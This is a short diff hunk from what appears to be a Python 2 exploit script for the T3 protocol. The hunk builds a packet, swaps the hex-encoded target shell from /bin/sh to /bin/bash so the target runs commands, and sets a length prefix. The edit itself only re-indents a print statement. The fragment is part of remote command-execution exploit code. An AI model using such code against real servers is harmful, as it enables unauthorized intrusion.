@@ -114,7 +114,7 @@ def update_payload():
 	# if shell is bash replace "/bin/sh" with "/bin/bash"
 	elif shell == 'bash':
 		packet = packet.replace( '72f62696e2f7368', '92f62696e2f62617368' )
-	if verbose: print '[INFO] Target os is unix: using "/bin/'+shell+' -c"\n'
+		if verbose: print '[INFO] Target os is unix: using "/bin/'+shell+' -c"\n'
 
 # t3 packet must be preceeded by the total length of the packet (bytes) represented in hexa
 def update_length():
